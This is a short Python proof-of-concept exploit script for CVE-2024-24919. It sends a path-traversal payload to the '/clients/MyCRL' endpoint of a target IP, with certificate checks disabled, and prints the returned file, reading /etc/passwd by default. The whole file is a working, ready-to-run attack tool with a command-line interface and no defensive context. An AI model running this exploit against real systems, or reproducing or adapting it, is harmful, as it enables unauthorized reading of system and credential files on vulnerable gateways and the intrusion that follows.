#!/usr/bin/env python3
import requests
from argparse import ArgumentParser
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(ip, path):
  target = f'https://{ip}/clients/MyCRL'
  data = f'aCSHELL/../../../../../../../../../../..{path}'

  headers = {
    'Host': f'{ip}',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Te': 'trailers',
    'Dnt': '1',
    'Connection': 'keep-alive',
    'Content-Length': '48'
  }

  response = requests.post(target, headers=headers, data=data, verify=False)

  if response.status_code == 200:
    print(response.text)

if __name__ == '__main__':
  parser = ArgumentParser(description='CVE-2024-24919 PoC')
  parser.add_argument('-i', '--ip', required=True)
  parser.add_argument('-p', '--path', default='/etc/passwd')
  args = parser.parse_args()

  try:
    exploit(args.ip, args.path)
  except EOFError:
    exit(1)
  except KeyboardInterrupt:
    exit(1)
